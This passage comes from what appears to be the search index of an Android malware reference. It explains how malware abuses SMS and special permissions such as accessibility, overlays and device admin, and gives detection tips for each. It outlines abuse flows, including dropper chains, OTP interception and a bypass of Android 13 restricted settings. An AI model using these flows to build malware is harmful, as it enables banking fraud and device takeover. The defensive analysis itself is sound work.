<p>This was the dominant Android malware monetization method from 2010-2014 before banking trojans became more profitable.</p>"},{"location":"permissions/sms/send-sms/#smishing-sms-phishing","title":"Smishing (SMS Phishing)","text":"<p>Sending phishing messages from the victim's phone to their contacts:</p> <ol> <li>Malware reads contact list (via <code>READ_CONTACTS</code>)</li> <li>Sends SMS to each contact with a malicious link</li> <li>Recipients trust the message because it comes from a known number</li> <li>Recipients click the link and install the malware</li> </ol> <p>FluBot spread across Europe using this exact method, reaching millions of devices.</p>"},{"location":"permissions/sms/send-sms/#c2-channel","title":"C2 Channel","text":"<p>SMS as a backup command-and-control channel:</p> <ul> <li>Works without internet</li> <li>Not visible to network monitoring tools</li> <li>Messages can be deleted from the sent folder to hide evidence</li> <li>C2 server sends commands via SMS to victim's number</li> </ul>"},{"location":"permissions/sms/send-sms/#notable-families","title":"Notable Families","text":"Family SMS Usage FakePlayer First Android malware (2010). Premium SMS only. FluBot SMS worm. Sent phishing to all contacts. Dismantled by Europol 2022. Joker Premium subscription via SMS and WAP billing. Thousands of Play Store variants. Harly Invisible subscription fraud via hidden WebView and SMS confirmation. GriftHorse Premium SMS at scale. 10M+ victims. TrickMo SMS forwarding for 2FA bypass. MoqHao Smishing distribution to victim's contacts. Pan-Asian campaigns. Rafel RAT SMS C2 channel as backup. Ransomware unlock via SMS. Anubis SMS forwarding, premium SMS capability. SpyNote Full SMS send/read/intercept. Mass deployment. Mamont SMS forwarding for OTP exfiltration."},{"location":"permissions/sms/send-sms/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): introduced default SMS app concept. Non-default apps can still send SMS but may not be able to write to the SMS content provider.</p> <p>Android 5.1 (API 22): premium SMS protections. System warns user before sending to premium numbers.</p> <p>Google Play 2019: restricted <code>SEND_SMS</code> to apps declared as default SMS handler or with approved use cases.</p>"},{"location":"permissions/sms/send-sms/#detection","title":"Detection","text":"<p><code>SEND_SMS</code> combined with <code>READ_CONTACTS</code> or <code>RECEIVE_SMS</code> suggests worm-like or phishing distribution behavior. Combined with <code>INTERNET</code>, suggests SMS data exfiltration or C2 relay.</p>"},{"location":"permissions/special/","title":"Special Permissions","text":"<p>Permissions outside the standard dangerous permission model that are heavily abused in malware. These require special user actions to grant (settings toggles, installer prompts) rather than runtime dialogs.</p>"},{"location":"permissions/special/#permissions","title":"Permissions","text":"Permission Abuse Potential Malware Usage SYSTEM_ALERT_WINDOW Draw over other apps, enabling overlay attacks, credential phishing, tapjacking Most banking trojans WRITE_SETTINGS Modify system settings, change default apps, disable security features Rare in modern malware REQUEST_INSTALL_PACKAGES Install APKs, sideload malware, dropper functionality Droppers, multi-stage families REQUEST_DELETE_PACKAGES Uninstall apps, remove security software Anti-AV behavior MANAGE_EXTERNAL_STORAGE Full filesystem access, bypass scoped storage restrictions Spyware, ransomware BIND_ACCESSIBILITY_SERVICE Full UI interaction: keylogging, auto-granting permissions, device takeover Nearly all modern families BIND_NOTIFICATION_LISTENER_SERVICE Read all notifications, intercept OTPs, exfiltrate messages Alien, Mamont, FireScam BIND_DEVICE_ADMIN Device administration: lock device, wipe data, enforce policies BRATA, Rafel RAT, BingoMod PACKAGE_USAGE_STATS App usage data, track user behavior, identify active apps for overlay timing Overlay-based families USE_FULL_SCREEN_INTENT Launch activities over lock screen, phishing on locked devices TrickMo, TsarBot"},{"location":"permissions/special/#granting-mechanism","title":"Granting Mechanism","text":"<p>Unlike dangerous permissions that show a simple dialog, special permissions require the user to navigate to Android Settings:</p> Permission How It's Granted How Malware Obtains It <code>SYSTEM_ALERT_WINDOW</code> Settings &gt; Apps &gt; Special access &gt; Display over other apps Social engineering prompt, or auto-granted for Play Store installs (pre-Android 10) <code>BIND_ACCESSIBILITY_SERVICE</code> Settings &gt; Accessibility &gt; [App Name] Persistent fake prompts claiming the app needs \"accessibility\" for security <code>BIND_DEVICE_ADMIN</code> Settings &gt; Security &gt; Device admin apps Often combined with ransomware lock to prevent removal <code>REQUEST_INSTALL_PACKAGES</code> Settings &gt; Apps &gt; Special access &gt; Install unknown apps Requested as part of \"update\" flow <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Settings &gt; Apps &gt; Special access &gt; Notification access Presented as needed for \"message security\" <p>On Android 13+, Restricted Settings blocks sideloaded apps from directly requesting accessibility and notification listener. Malware bypasses this through session-based installation or by convincing users to manually navigate through the extra confirmation step.</p>"},{"location":"permissions/special/bind-accessibility-service/","title":"BIND_ACCESSIBILITY_SERVICE","text":"<p>The single most powerful permission in Android malware. An accessibility service can observe and interact with every element on screen, read notifications, perform gestures, and type text into any field. Modern banking trojans treat this as the primary goal: once granted, full device takeover is possible without any other permission.</p>"},{"location":"permissions/special/bind-accessibility-service/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BIND_ACCESSIBILITY_SERVICE</code> Protection Level <code>signature</code> Grant Method Settings &gt; Accessibility &gt; toggle on Introduced API 16 (Android 4.1) <p>The <code>signature</code> protection level means only the system can bind to an accessibility service. The app declares the service in its manifest; the user enables it manually through system settings. No runtime permission dialog appears. Android shows a full-screen warning explaining the access being granted.</p>"},{"location":"permissions/special/bind-accessibility-service/#what-it-enables","title":"What It Enables","text":"<p>An accessibility service receives <code>AccessibilityEvent</code> callbacks and can use <code>AccessibilityNodeInfo</code> to traverse and interact with the UI tree of any foreground app.</p>"},{"location":"permissions/special/bind-accessibility-service/#capabilities","title":"Capabilities","text":"Capability API Impact Read screen content <code>AccessibilityNodeInfo.getText()</code> Keylogging, credential theft Perform clicks <code>performAction(ACTION_CLICK)</code> Auto-grant permissions, confirm installs Perform gestures <code>GestureDescription</code> (API 24+) Swipe, scroll, interact with any UI Fill text fields <code>Bundle(ACTION_SET_TEXT)</code> Inject text into any input Read notifications <code>FLAG_RETRIEVE_INTERACTIVE_WINDOWS</code> OTP interception Capture screen <code>takeScreenshot()</code> (API 30+) Screenshot any app Control display <code>GLOBAL_ACTION_LOCK_SCREEN</code> (API 28+) Lock screen to hide activity Enumerate windows <code>getWindows()</code> Detect which app is in foreground"},{"location":"permissions/special/bind-accessibility-service/#effective-permission-escalation","title":"Effective Permission Escalation","text":"<p>With accessibility alone, malware can:</p> <ul> <li>Grant itself other permissions by navigating to Settings &gt; Apps and clicking \"Allow\"</li> <li>Install additional APKs by clicking through install dialogs</li> <li>Disable Play Protect by navigating to Play Store settings</li> <li>Prevent its own uninstall by detecting Settings navigation and pressing Back/Home</li> <li>Perform on-device fraud (ODF) by operating banking apps directly</li> </ul>"},{"location":"permissions/special/bind-accessibility-service/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Nearly every modern Android banking trojan requires accessibility. The typical flow:</p> <ol> <li>App installed (sideloaded or via dropper on Play Store)</li> <li>Social engineering overlay prompts user to enable accessibility</li> <li>Once enabled, malware auto-grants itself remaining permissions</li> <li>Malware operates autonomously: overlay attacks, OTP interception, automated transactions</li> </ol>"},{"location":"permissions/special/bind-accessibility-service/#notable-families","title":"Notable Families","text":"Family Accessibility Usage Anatsa (TeaBot) Auto-grants permissions, performs ATS (Automated Transfer System) fraud Cerberus / Alien Overlay injection, keylogging, OTP theft, anti-uninstall SharkBot ATS fraud via accessibility, auto-fills transfer details Joker Auto-subscribes to premium services by clicking through WAP billing pages Medusa (TangleBot) Full RAT capabilities via accessibility, screen streaming Xenomorph Overlay + accessibility for complete ATS chain Hook VNC-like remote access built on accessibility events"},{"location":"permissions/special/bind-accessibility-service/#android-version-changes","title":"Android Version Changes","text":"<p>Android 7 (API 24): <code>GestureDescription</code> API added, enabling gesture-based interaction beyond simple clicks.</p> <p>Android 11 (API 30): restricted which apps appear in accessibility settings for apps targeting API 30+. Apps must declare <code>isAccessibilityTool=\"true\"</code> in metadata or their service is hidden. Sideloaded apps targeting older APIs bypass this.</p> <p>Android 13 (API 33): restricted settings introduced. Apps installed from outside recognized app stores cannot navigate users to accessibility settings. The system blocks the intent and shows a \"Restricted setting\" dialog. Bypassed by session-based installers or targeting API &lt; 33.</p> <p>Android 15 (API 35): expanded restricted settings enforcement, harder to bypass with older targetSdkVersion.</p>"},{"location":"permissions/special/bind-accessibility-service/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;service\n    android:name=\".MyAccessibilityService\"\n    android:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.accessibilityservice.AccessibilityService\" /&gt;\n    &lt;/intent-filter&gt;\n    &lt;meta-data\n        android:name=\"android.accessibilityservice\"\n        android:resource=\"@xml/accessibility_config\" /&gt;\n&lt;/service&gt;\n</code></pre> <p>The <code>accessibility_config.xml</code> reveals scope:</p> <pre><code>&lt;accessibility-service\n    android:accessibilityEventTypes=\"typeAllMask\"\n    android:accessibilityFeedbackType=\"feedbackGeneric\"\n    android:canRetrieveWindowContent=\"true\"\n    android:canPerformGestures=\"true\"\n    android:accessibilityFlags=\"flagRetrieveInteractiveWindows\" /&gt;\n</code></pre> <p>Red flags: <code>typeAllMask</code> event types, <code>canRetrieveWindowContent</code>, <code>canPerformGestures</code>, <code>flagRetrieveInteractiveWindows</code>.</p>"},{"location":"permissions/special/bind-accessibility-service/#further-reading","title":"Further Reading","text":"<ul> <li>Google's AccessibilityService reference</li> <li>ThreatFabric's banking trojan reports document accessibility abuse patterns extensively</li> <li>MITRE T1453 covers this at a taxonomic level</li> </ul>"},{"location":"permissions/special/bind-device-admin/","title":"BIND_DEVICE_ADMIN","text":"<p>Grants device administration capabilities: locking the screen, wiping data, enforcing password policies, and preventing its own uninstallation. Early Android malware (2013-2016) used device admin heavily for ransomware and persistence. Modern malware prefers accessibility services, but device admin still appears in some families.</p>"},{"location":"permissions/special/bind-device-admin/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BIND_DEVICE_ADMIN</code> Protection Level <code>signature</code> Grant Method User must explicitly activate via system dialog Introduced API 8 (Android 2.2) <p>The app declares a <code>DeviceAdminReceiver</code> in its manifest. When the app requests activation, Android shows a full-screen dialog listing all the capabilities the admin is requesting. The user must explicitly confirm.</p>"},{"location":"permissions/special/bind-device-admin/#what-it-enables","title":"What It Enables","text":"Capability API Method Impact Lock screen <code>lockNow()</code> Immediately lock device Set password <code>resetPassword()</code> Force a lock screen password Wipe device <code>wipeData()</code> Factory reset, destroying all data Set password quality <code>setPasswordQuality()</code> Enforce password complexity Monitor failed attempts <code>setMaximumFailedPasswordsForWipe()</code> Auto-wipe after N failed attempts Disable camera <code>setCameraDisabled()</code> Block camera use Prevent uninstall Implicit Device admin apps cannot be uninstalled until deactivated"},{"location":"permissions/special/bind-device-admin/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/bind-device-admin/#ransomware","title":"Ransomware","text":"<p>The primary abuse case historically. Malware activates device admin, then:</p> <ol> <li>Locks the screen with <code>lockNow()</code></li> <li>Changes the password with <code>resetPassword()</code></li> <li>Displays ransom message</li> <li>Threatens <code>wipeData()</code> if ransom is not paid</li> </ol>"},{"location":"permissions/special/bind-device-admin/#anti-uninstall","title":"Anti-Uninstall","text":"<p>A device admin app cannot be uninstalled through normal means. The user must first navigate to Settings &gt; Security &gt; Device Administrators and deactivate the admin, then uninstall. Malware using accessibility can prevent the user from reaching these settings.</p>"},{"location":"permissions/special/bind-device-admin/#notable-families","title":"Notable Families","text":"Family Device Admin Usage Obad First major device admin abuse (2013). Hid itself from admin list using a vulnerability. Koler Police ransomware. Lock screen with fake law enforcement message. Simplocker File encryption + device admin lock. LokiBot Activates ransomware mode via device admin when user tries to revoke. Cerberus Optional device admin for anti-uninstall. Rafel RAT DeviceAdmin for ransomware lock screen, password reset, and device wipe BRATA Factory reset via <code>wipeData()</code> after completing fraud to destroy evidence BingoMod Device wipe after on-device fraud to erase forensic traces"},{"location":"permissions/special/bind-device-admin/#android-version-changes","title":"Android Version Changes","text":"<p>Android 7.0 (API 24): <code>resetPassword()</code> deprecated for device admin. Only device owner (MDM) or profile owner can reset passwords.</p> <p>Android 9.0 (API 28): device admin policies for password quality, password expiration, and other features deprecated in favor of managed profiles. Device admin is being phased out for enterprise use in favor of Android Enterprise.</p> <p>Android 10+ (API 29+): <code>resetPassword()</code> completely removed for device admin apps. Ransomware using this technique only works on older Android versions.</p>"},{"location":"permissions/special/bind-device-admin/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;receiver android:name=\".AdminReceiver\"\n    android:permission=\"android.permission.BIND_DEVICE_ADMIN\"&gt;\n    &lt;meta-data android:name=\"android.app.device_admin\"\n        android:resource=\"@xml/device_admin\" /&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.app.action.DEVICE_ADMIN_ENABLED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>The <code>device_admin.xml</code> declares requested policies:</p> <pre><code>&lt;device-admin&gt;\n    &lt;uses-policies&gt;\n        &lt;force-lock /&gt;\n        &lt;wipe-data /&gt;\n        &lt;reset-password /&gt;\n    &lt;/uses-policies&gt;\n&lt;/device-admin&gt;\n</code></pre> <p>Any non-MDM app requesting <code>force-lock</code>, <code>wipe-data</code>, or <code>reset-password</code> policies is suspicious.</p>"},{"location":"permissions/special/bind-notification-listener-service/","title":"BIND_NOTIFICATION_LISTENER_SERVICE","text":"<p>Allows reading the content of all notifications posted by any app. Increasingly used as an alternative to <code>READ_SMS</code> for OTP interception: banks send OTP codes that appear in notifications, and a notification listener captures them without needing SMS permissions.</p>"},{"location":"permissions/special/bind-notification-listener-service/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BIND_NOTIFICATION_LISTENER_SERVICE</code> Protection Level <code>signature</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Notification access Introduced API 18 (Android 4.3) <p>Like accessibility services, only the system can bind to a notification listener. The user must manually enable it in settings.</p>"},{"location":"permissions/special/bind-notification-listener-service/#what-it-enables","title":"What It Enables","text":"<p>The service receives callbacks for every notification posted or removed on the device:</p> <pre><code>public class NotifListener extends NotificationListenerService {\n    @Override\n    public void onNotificationPosted(StatusBarNotification sbn) {\n        String packageName = sbn.getPackageName();\n        String text = sbn.getNotification().extras.getString(Notification.EXTRA_TEXT);\n        String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);\n    }\n}\n</code></pre> <p>Capabilities:</p> Capability Method Read notification content <code>onNotificationPosted()</code> Read notification history <code>getActiveNotifications()</code> Dismiss notifications <code>cancelNotification()</code> Snooze notifications <code>snoozeNotification()</code> (API 26+)"},{"location":"permissions/special/bind-notification-listener-service/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/bind-notification-listener-service/#otp-interception-sms-alternative","title":"OTP Interception (SMS Alternative)","text":"<p>Many banks and services include the OTP code directly in the notification text. A notification listener grabs it without needing <code>READ_SMS</code> or <code>RECEIVE_SMS</code>:</p> <ol> <li>User triggers a login/transaction that requires 2FA</li> <li>Bank sends SMS with OTP</li> <li>Phone displays notification: \"Your code is 123456\"</li> <li>Notification listener reads the notification text</li> <li>Malware forwards the code to C2</li> </ol> <p>This bypasses Google Play's SMS permission restrictions, since notification access is not subject to the same policy scrutiny.</p>"},{"location":"permissions/special/bind-notification-listener-service/#message-exfiltration","title":"Message Exfiltration","text":"<p>Read messages from WhatsApp, Telegram, Signal, and other messaging apps via their notifications. Each notification contains sender name and message preview.</p>"},{"location":"permissions/special/bind-notification-listener-service/#notification-dismissal","title":"Notification Dismissal","text":"<p>Malware can dismiss notifications to hide its activity:</p> <ul> <li>Dismiss banking app transaction alerts</li> <li>Dismiss security warnings</li> <li>Dismiss AV detection notifications</li> </ul>"},{"location":"permissions/special/bind-notification-listener-service/#foreground-app-detection","title":"Foreground App Detection","text":"<p>Notifications from apps reveal which apps are active, serving as an alternative to <code>UsageStatsManager</code> for timing overlay attacks.</p>"},{"location":"permissions/special/bind-notification-listener-service/#notable-families","title":"Notable Families","text":"Family Notification Usage Cerberus Notification-based OTP theft as alternative to SMS Alien Notification sniffing for 2FA codes. First family to make this a primary feature. Xenomorph Notification listener for OTP + message exfiltration Joker Read notifications to confirm premium subscriptions Hook Notification interception for WhatsApp message exfiltration Mamont Notification interception as primary OTP theft mechanism GodFather Notification-based push OTP capture Medusa v2 Reduced to 5 permissions, uses notification listener instead of SMS ToxicPanda Notification interception for OTP codes Sturnus Notification capture from encrypted messaging apps"},{"location":"permissions/special/bind-notification-listener-service/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.3 (API 18): notification listener service introduced.</p> <p>Android 13 (API 33): subject to restricted settings. Apps sideloaded from outside recognized stores cannot direct users to notification access settings.</p> <p>Android 13+: <code>POST_NOTIFICATIONS</code> runtime permission required for apps to show their own notifications (separate concern, but affects the ecosystem).</p>"},{"location":"permissions/special/bind-notification-listener-service/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;service\n    android:name=\".NotifListener\"\n    android:permission=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.service.notification.NotificationListenerService\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/service&gt;\n</code></pre> <p>Any app declaring this that isn't a notification management utility warrants investigation.</p>"},{"location":"permissions/special/manage-external-storage/","title":"MANAGE_EXTERNAL_STORAGE","text":"<p>Grants full access to all files on shared storage, bypassing Android's scoped storage restrictions introduced in Android 11. With this permission, an app can read, write, and delete any file on the device's external storage (except other apps' private directories).</p>"},{"location":"permissions/special/manage-external-storage/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.MANAGE_EXTERNAL_STORAGE</code> Protection Level <code>signature\\|appop</code> Grant Method Settings &gt; Apps &gt; Special access &gt; All files access Introduced API 30 (Android 11)"},{"location":"permissions/special/manage-external-storage/#what-it-enables","title":"What It Enables","text":"<p>Full access to <code>/sdcard/</code> and all shared storage, including:</p> <ul> <li>Documents, downloads, media files</li> <li>Other apps' publicly visible files</li> <li>WhatsApp media and databases (backup files)</li> <li>Filesystem-level operations (create, read, write, delete, enumerate)</li> </ul> <p>Without this permission, apps targeting API 30+ are limited to their own app-specific directory and media accessed through <code>MediaStore</code>.</p>"},{"location":"permissions/special/manage-external-storage/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/manage-external-storage/#data-exfiltration","title":"Data Exfiltration","text":"<p>Access to all files on the device enables:</p> <ul> <li>WhatsApp database extraction (<code>/sdcard/WhatsApp/Databases/msgstore.db.crypt14</code>)</li> <li>Document theft (PDFs, spreadsheets, photos)</li> <li>Backup file access</li> <li>Browser download folder contents</li> </ul>"},{"location":"permissions/special/manage-external-storage/#payload-dropping","title":"Payload Dropping","text":"<p>Write malicious APKs or DEX files to shared storage for later execution or social engineering-based installation.</p>"},{"location":"permissions/special/manage-external-storage/#file-manipulation","title":"File Manipulation","text":"<p>Replace legitimate files with modified versions (supply chain attack at the file level).</p>"},{"location":"permissions/special/manage-external-storage/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): scoped storage introduced. Apps targeting API 29 could opt out with <code>requestLegacyExternalStorage=\"true\"</code>.</p> <p>Android 11 (API 30): scoped storage enforced. <code>MANAGE_EXTERNAL_STORAGE</code> added as the escape hatch for apps that genuinely need broad file access (file managers, backup tools, antivirus).</p> <p>Android 11+: Google Play restricts this permission to apps that justify the need. Apps without a valid use case are rejected.</p>"},{"location":"permissions/special/manage-external-storage/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.MANAGE_EXTERNAL_STORAGE\" /&gt;\n</code></pre> <p>Any app that isn't a file manager, backup tool, or antivirus requesting this is worth investigating.</p>"},{"location":"permissions/special/package-usage-stats/","title":"PACKAGE_USAGE_STATS","text":"<p>Allows querying app usage statistics: which apps were used, when, and for how long. Used by malware to detect when a target banking app is in the foreground, triggering overlay attacks at the right moment.</p>"},{"location":"permissions/special/package-usage-stats/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.PACKAGE_USAGE_STATS</code> Protection Level <code>signature\\|privileged\\|development\\|appop</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Usage access Introduced API 21 (Android 5.0)"},{"location":"permissions/special/package-usage-stats/#what-it-enables","title":"What It Enables","text":"<p>Access to <code>UsageStatsManager</code>:</p> <pre><code>UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);\nlong time = System.currentTimeMillis();\nList&lt;UsageStats&gt; stats = usm.queryUsageStats(\n    UsageStatsManager.INTERVAL_DAILY, time - 1000 * 60, time);\n</code></pre> <p>Also enables <code>UsageEvents</code> for more granular event tracking:</p> <pre><code>UsageEvents events = usm.queryEvents(startTime, endTime);\nwhile (events.hasNextEvent()) {\n    UsageEvents.Event event = new UsageEvents.Event();\n    events.getNextEvent(event);\n    if (event.getEventType() == UsageEvents.Event.MOVE_TO_FOREGROUND) {\n        String pkg = event.getPackageName();\n    }\n}\n</code></pre>"},{"location":"permissions/special/package-usage-stats/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/package-usage-stats/#foreground-detection-for-overlays","title":"Foreground Detection for Overlays","text":"<p>The primary abuse case. Malware polls <code>UsageStatsManager</code> every 1-2 seconds to check which app is in the foreground:</p> <ol> <li>Poll <code>queryUsageStats()</code> or <code>queryEvents()</code></li> <li>Check if the foreground package matches a target (banking app)</li> <li>If match found, display overlay immediately</li> </ol> <p>This is the non-accessibility method for triggering overlays. Less efficient than accessibility events (requires polling) but doesn't require the user to enable an accessibility service.</p>"},{"location":"permissions/special/package-usage-stats/#user-behavior-profiling","title":"User Behavior Profiling","text":"<p>Track which apps the user opens, when, and for how long. Useful for:</p> <ul> <li>Determining the best time to display social engineering prompts</li> <li>Identifying high-value targets (banking apps that are actively used)</li> <li>Detecting security tools being launched</li> </ul>"},{"location":"permissions/special/package-usage-stats/#app-installation-tracking","title":"App Installation Tracking","text":"<p><code>UsageEvents</code> includes <code>PACKAGE_INSTALLED</code> and <code>PACKAGE_REMOVED</code> events, revealing when apps are installed or uninstalled.</p>"},{"location":"permissions/special/package-usage-stats/#android-version-changes","title":"Android Version Changes","text":"<p>Android 5.0 (API 21): <code>UsageStatsManager</code> introduced with this permission.</p> <p>Android 5.1+: some vendors (Samsung, Huawei) modified the default grant behavior, making it easier or harder to access depending on the OEM.</p>"},{"location":"permissions/special/package-usage-stats/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.PACKAGE_USAGE_STATS\" /&gt;\n</code></pre> <p>Combined with <code>SYSTEM_ALERT_WINDOW</code> or <code>INTERNET</code>, indicates overlay attack infrastructure. The polling pattern (repeated <code>queryUsageStats</code> calls in a service or scheduled task) is a strong behavioral indicator.</p>"},{"location":"permissions/special/request-delete-packages/","title":"REQUEST_DELETE_PACKAGES","text":"<p>Allows an app to request uninstallation of other apps. The user sees a confirmation dialog. Used by malware to remove antivirus, security tools, or competing malware from the device.</p>"},{"location":"permissions/special/request-delete-packages/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.REQUEST_DELETE_PACKAGES</code> Protection Level <code>normal</code> Grant Method Automatically at install time Introduced API 26 (Android 8.0)"},{"location":"permissions/special/request-delete-packages/#what-it-enables","title":"What It Enables","text":"<pre><code>Intent intent = new Intent(Intent.ACTION_DELETE);\nintent.setData(Uri.parse(\"package:com.security.app\"));\nstartActivity(intent);\n</code></pre> <p>This shows the system uninstall confirmation dialog for the target package. The user must confirm.</p>"},{"location":"permissions/special/request-delete-packages/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/request-delete-packages/#removing-security-software","title":"Removing Security Software","text":"<p>Malware can prompt uninstallation of antivirus or security tools:</p> <ol> <li>Detect installed security apps (via <code>QUERY_ALL_PACKAGES</code>)</li> <li>Trigger uninstall dialog for each one</li> <li>If the malware has accessibility, click \"OK\" on the confirmation automatically</li> </ol>"},{"location":"permissions/special/request-delete-packages/#removing-competing-malware","title":"Removing Competing Malware","text":"<p>Some malware families uninstall competing trojans from the device.</p>"},{"location":"permissions/special/request-delete-packages/#combined-with-accessibility","title":"Combined with Accessibility","text":"<p>With <code>BIND_ACCESSIBILITY_SERVICE</code>, the malware can click through uninstall confirmations without user interaction, making this effectively a silent uninstall capability.</p>"},{"location":"permissions/special/request-delete-packages/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.REQUEST_DELETE_PACKAGES\" /&gt;\n</code></pre> <p>Combined with <code>QUERY_ALL_PACKAGES</code> and accessibility, indicates targeted removal of other apps.</p>"},{"location":"permissions/special/request-install-packages/","title":"REQUEST_INSTALL_PACKAGES","text":"<p>Allows an app to initiate APK installations. Used by malware as a dropper mechanism: the first-stage app downloads a payload APK and triggers installation. The user still sees an install confirmation dialog, but social engineering handles that.</p>"},{"location":"permissions/special/request-install-packages/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.REQUEST_INSTALL_PACKAGES</code> Protection Level <code>signature\\|appop</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Install unknown apps Introduced API 26 (Android 8.0) <p>Before Android 8.0, sideloading was a single global toggle (\"Unknown sources\"). Android 8 changed this to per-app: each app must be individually authorized to install APKs.</p>"},{"location":"permissions/special/request-install-packages/#what-it-enables","title":"What It Enables","text":"<p>The app can call <code>Intent(Intent.ACTION_INSTALL_PACKAGE)</code> or use <code>PackageInstaller</code> session APIs to trigger APK installation. The user sees a system install confirmation screen.</p> <p>On Android 12+, apps can use <code>PackageInstaller.Session</code> to silently update themselves if they are the \"installer of record\" for the package being updated.</p>"},{"location":"permissions/special/request-install-packages/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/request-install-packages/#dropper-pattern","title":"Dropper Pattern","text":"<ol> <li>Dropper published on Play Store (disguised as a utility)</li> <li>Dropper passes Play Protect because it contains no malicious code</li> <li>After install, dropper downloads malware APK from C2</li> <li>Dropper prompts user to enable \"Install unknown apps\"</li> <li>Dropper triggers installation of the payload</li> <li>Payload requests accessibility and overlay permissions</li> </ol>"},{"location":"permissions/special/request-install-packages/#multi-stage-delivery","title":"Multi-Stage Delivery","text":"<p>Families like Sharkbot and Anatsa use this flow. The Play Store listing is clean. The malicious payload arrives after installation, often delayed to avoid automated analysis.</p>"},{"location":"permissions/special/request-install-packages/#session-based-install-bypass","title":"Session-Based Install Bypass","text":"<p>On Android 13+, apps installed via session-based <code>PackageInstaller.Session</code> are not subject to restricted settings. The installed payload can request accessibility service access. Malware actively exploits this by using session-based installation rather than <code>ACTION_VIEW</code> intents.</p>"},{"location":"permissions/special/request-install-packages/#notable-families","title":"Notable Families","text":"Family Dropper / Install Abuse SharkBot Play Store dropper downloads and installs payload APK post-install Anatsa Play Store droppers disguised as PDF/cleaner apps, delayed payload delivery PlainGnome Two-stage dropper architecture with separate surveillance payload Brokewell Session-based installer to bypass Android 13 restricted settings BlankBot Session-based <code>PackageInstaller</code> to bypass Android 13+ sideload restrictions"},{"location":"permissions/special/request-install-packages/#android-version-changes","title":"Android Version Changes","text":"<p>Android 8.0 (API 26): per-app install permission introduced.</p> <p>Android 13 (API 33): restricted settings block sideloaded apps from accessing accessibility and notification listener. Session-based installers bypass this.</p> <p>Android 14 (API 34): tightened session-based installer restrictions, requiring specific intent filter declarations.</p>"},{"location":"permissions/special/request-install-packages/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.REQUEST_INSTALL_PACKAGES\" /&gt;\n</code></pre> <p>Any non-app-store app requesting this is worth investigating. Legitimate use cases outside of app stores and enterprise MDM are rare.</p>"},{"location":"permissions/special/system-alert-window/","title":"SYSTEM_ALERT_WINDOW","text":"<p>Allows drawing windows on top of all other apps. This is the foundation of overlay attacks: malware draws a fake login screen over a legitimate banking app and captures whatever the user types. The most common credential-stealing technique in Android banking malware.</p>"},{"location":"permissions/special/system-alert-window/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.SYSTEM_ALERT_WINDOW</code> Protection Level <code>signature\\|appop\\|pre23\\|development</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Display over other apps Introduced API 1 <p>Before Android 6.0, this was a normal install-time permission. Since API 23, users must manually toggle it in settings. On Android 6-7, apps could auto-grant by using <code>TYPE_TOAST</code> windows as a loophole (patched in Android 8).</p>"},{"location":"permissions/special/system-alert-window/#what-it-enables","title":"What It Enables","text":"<p>The app can create windows using <code>WindowManager.addView()</code> with types that render above all other applications:</p> Window Type Behavior <code>TYPE_APPLICATION_OVERLAY</code> (API 26+) Standard overlay, above apps but below system UI <code>TYPE_PHONE</code> (deprecated API 26) Pre-Oreo overlay type <code>TYPE_SYSTEM_ALERT</code> (deprecated API 26) Pre-Oreo overlay type <code>TYPE_TOAST</code> (restricted API 26) Exploitable for grantless overlays on Android 6-7 <p>Overlays can be:</p> <ul> <li>Fully opaque: replaces the visible UI entirely (phishing)</li> <li>Transparent/passthrough: invisible layer capturing touches (tapjacking)</li> <li>Partial: covers just input fields or buttons</li> </ul>"},{"location":"permissions/special/system-alert-window/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/system-alert-window/#credential-phishing-overlay-attack","title":"Credential Phishing (Overlay Attack)","text":"<ol> <li>Malware monitors foreground app using <code>UsageStatsManager</code> or accessibility</li> <li>When a target banking app opens, malware draws a fake login screen on top</li> <li>User enters credentials into the overlay thinking it's the real app</li> <li>Malware sends credentials to C2</li> </ol> <p>The overlay is typically a WebView loading HTML styled to match the target app. Malware families maintain \"injection\" or \"webfake\" lists: HTML templates for hundreds of banking apps, downloaded from C2 on 